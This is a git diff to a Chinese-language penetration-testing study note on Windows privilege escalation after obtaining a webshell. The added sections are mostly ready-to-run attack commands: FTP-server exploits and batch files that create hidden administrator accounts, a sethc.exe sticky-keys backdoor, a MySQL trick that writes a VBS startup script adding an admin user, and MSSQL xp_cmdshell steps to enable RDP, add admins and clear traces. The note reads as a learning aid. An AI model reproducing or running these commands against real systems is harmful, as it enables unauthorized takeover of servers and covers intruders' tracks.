@@ -59,7 +59,9 @@ certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete         
 
 
 
-## 0x02 挖洞getshell后的一般流程和思路
+## 0x02 后渗透的一般流程和思路
+
+拿到webshell后要做的事情：
 
 - 服务器信息搜集（系统信息、端口扫描等）
 - 提权（利用数据库漏洞、系统漏洞、第三方软件漏洞等）
@@ -96,6 +98,8 @@ net user abc 123 /add 			# 添加一个用户名为abc密码为123的用户
 net localgroup administrators abc /add 		# 将用户abc添加到管理员组
 whoami 			# 查看当前操作用户（当前权限）
 hostname		# 查看当前计算机名称
+query user		# 查看管理员是否在线
+msg administrator who are you	# 发送信息“who are you”给管理员
 
 # 获取防火墙有关信息(仅用于XP SP2及更高版本)：
 netsh firewall show state
@@ -113,23 +117,285 @@ tasklist /SVC
 
 
 
-## 0x04 windows提权
+## 0x04 windows常见提权方式
 
-#### 1. 第三方软件提权
+#### 1. 普通账户提权
 
-#### 2. 溢出提权
+- 第三方软件提权
+- 溢出提权
+- 启动项提权
+- 破解hash提权
+- 数据库提权
 
-#### 3. 启动项提权
+#### 2. 域内提权
 
-#### 4. 破解hash提权
+- PTH
+- ms14-068域内提权
+- CVE-2020-1472
+- kekeo 域内主机提权
 
-#### 5. 数据库提权
 
-未更完待续。
+
+## 0x05 第三方软件提权
+
+#### 1. 常见第三方软件提权
+
+- FTP软件：server-u、g6ftp、Filezilla
+
+- 远程管理软件：PCanywhere、radmin、vnc
+
+#### 2. server-u提权
+
+- 有修改权限
+	- 检查是否有可写权限 修改server-u默认安装目录下的ServUDaemon.ini
+	- 增加用户，该用户拥有管理员权限
+	- 连接新用户
+	- 执行命令
+	
+
+增加新用户的命令如下：
+
+```shell
+quote site exec net user abc 123 /add
+quote site exec net localgroup administrators abc /add
+```
+
+- 无修改权限
+
+首先暴力破解md5，然后进行溢出提权。
+
+#### 3. G6ftp提权
+
+- 下载管理配置文件，将administrator管理密码破解。
+
+- 使用lcx端口转发（默认只允许本机连接）。
+
+```shell
+lcx.exe -tran 8027 127.0.0.1 9999
+```
+
+- 使用客户端以管理员用户登录。
+
+- 创建用户并设置权限和执行的批处理文件xxx.bat。
+
+- 上传批处理，并命名批处理命令为xxx。
+
+- 以创建的普通用户登录ftp。
+
+- 执行命令。
+
+```shell
+......>ftp 192.168.1.100	# 这里在本地的命令行或终端ftp
+......
+User(...):abc		# 这里输入新建用户名
+...
+Password:		# 这里输入新建用户的密码
+...logged in.
+ftp> quote site xxx		# 这里执行批处理命令xxx即可
+...command executed.
+ftp>
+```
+xxx.bat内容为添加系统用户，如下：
+
+```
+net user abc 123 /add
+net localgroup administrators abc /add
+```
+
+#### 4. Filezilla提权
+- 简介
+
+Filezilla是一款开源的FTP服务器和客户端的软件。
+
+若安装了服务器端默认只监听127.0.0.1的14147端口，并且默认安装目录下有两个敏感文件filezillaserver.xml（包含了用户信息）和filezillaserver interface.xml（包含了管理信息）。
+
+- 提权思路
+	- 下载这两个文件，拿到管理密码。
+	- 配置端口转发，登录远程管理ftpserver，创建ftp用户。
+	- 分配权限，设置家目录为`C:\`。
+	- 使用cmd.exe改名为sethc.exe替换`C:\windows\system32\sethc.exe`生成shift后门
+	- 连接3389按5次shift调出cmd.exe
+
+#### 5. pcanywhere提权
+- 访问pcanywhere默认安装目录
+- 下载用户配置文件
+- 通过破解账户密码文件
+
+#### 6. radmin提权
+- 通过端口扫描，扫描4899端口
+- 上传radmin.asp木马读取radmin的加密密文
+- 使用工具连接（如一些大马，目前找到的大马没有，但看别人有）
+
+#### 7. vnc提权
+- 通过读取注册表十进制数
+- 转换成十六进制数
+- 破解十六进制数得到密码
+
+```shell
+vncx4.exe -W
+```
+
+- 逐个输入转换后的十六进制数（输一个十六进制数就回车），即可破解得到密码。
+- 连接vnc
+
+注：学习的时候我没找到这个工具，但是找了另一个可以替换用一下，**K8fuckVNC4.exe**。
+
+
+
+## 0x06 溢出提权
+
+#### 1. 简介
+
+溢出提权主要是通过windows漏洞利用来获取系统权限。
+
+#### 2. 常见的溢出提权
+
+- 巴西烤肉
+- pr
+
+#### 3. 步骤
+
+- 通过信息收集查看服务器打了哪些补丁
+- 根据未打补丁漏洞进行利用即可（可以利用GetRoot Tools.exe查找漏洞）
+
+
+
+## 0x07 启动项提权
+
+#### 1.查看数据库中有哪些数据表
+
+```mysql
+show tables;
+```
+
+默认情况下，test数据库中没有任何表的存在。
+
+#### 2.在TEST数据库下创建一个新的表
+
+```mysql
+create table a(cmd text);
+```
+
+创建了一个表名为a，表中只存放一个字段，字段名为cmd，类型时text文本。
+
+#### 3.在表中插入内容
+
+```mysql
+insert into a values("set wshshell=createobject (""wscript.shell"")");
+insert into a values("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");
+insert into a values("b=wshshell.run(""cmd.exe /c net localgroup Administrators 1 /add"",0)");
+```
+
+注意双引号和括号以及后面的“0”一定要输入！这三条命令建立一个VBS脚本程序。
+
+#### 4.查看表a
+
+```mysql
+select * from a;
+```
+
+表中有三行数据，就是前面输入的内容，确认输入无误后继续往下。
+
+#### 5.输出表为一个VBS的脚本文件
+
+```mysql
+select * from a into outfile "C://Users//User//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//a.vbs";
+```
+
+#### 6.重启即可
+
+
+
+## 0x08 破解hash提权
+
+#### 1. 所需工具
+
+- pwdump7.exe（windows Hash密码导出工具）
+
+- LC5.exe（windows Hash密码破解工具）
+- 彩虹表（哈希链集，用于破解hash）
+- getpass.exe（windows Hash密码破解一条龙，但我在网上找到的都运行不了）
+
+#### 2. 步骤
+
+- 上传pwdump7.exe运行获取hash值
+- 拿到LC5、彩虹表中破解即可得到管理员密码（需要管理员权限才能执行读取hash操作）
+
+
+
+## 0x09 Mssql数据库提权
+#### 1. 前提条件
+
+需要具备数据库管理员权限才可执行提权操作。
+
+sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。
+
+#### 2. 提权步骤
+
+- 安装xp_cmd_shell
+```
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
+```
+
+最后清理痕迹时可以删除组件：
+
+```
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE
+```
+
+- 开启3389
+```
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;-- 
+```
+
+或者
+
+```
+exec master..xp_cmdshell 'sc config termservice start=auto';
+exec master..xp_cmdshell 'net start termservice';
+exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f';        # 允许外部连接
+```
+
+最后清理痕迹时可以关闭3389：
+
+```
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;
+```
+
+- 新建管理员用户并连接
+
+```
+exec master..xp_cmdshell 'net user abc 123 /add';exec master..xp_cmdshell 'net localgroup administrators abc /add';
+```
+
+创建新用户abc并添加到管理员组，远程连接管理员用户即可。
+
+- 拿本地账户Administrator的密码
+
+方案一：
+
+方案二：
+
+#### 3. sa账号的获取
+
+可以通过查看config.asp、conn.asp等文件
+
+如果是aspx，可能在web.config文件
+
+
+
+## 0x0a MySQL数据库提权
+
+#### 1. 前提条件
+
+需要具备数据库管理员权限才可执行提权操作。
+
+sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。
 
 
 
 ## 0xff 常见windows存在的漏洞端口
+
 - 445 ms17-010 永恒之蓝（windows 10 以前）
 - 3389 CVE-2019-0708 BlueKeep（windows7/windows2008）
 - 445 ms08-067（windows2008以前）
